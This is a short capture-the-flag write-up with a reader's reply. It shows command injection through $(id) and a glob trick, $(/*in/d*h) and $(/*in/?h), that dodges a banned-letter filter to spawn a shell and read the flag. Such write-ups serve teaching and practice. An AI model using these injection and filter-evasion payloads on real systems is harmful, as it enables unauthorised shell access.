Tried to get a shell after figuring out that I could launch command this manner :

$(id)

Your input:
$(id)
Your command is: uid=1001(level2) gid=1001(level2) groups=1001(level2)
Your input:

I wanted to get a shell so I used the glob expand bash feature :

I used "dash" because I could not use the "b" letter :

$(/*in/d*h)
cat flag.txt
exit
Your command is: FLAG-a78i8TFD60z3825292rJ9JK12gIyVI5P
Your input:

Then a writeup was written and the challenge update to outlaw the letter D as well.

James:
I did the same thing but using $(/*in/?h) to get a sh shell
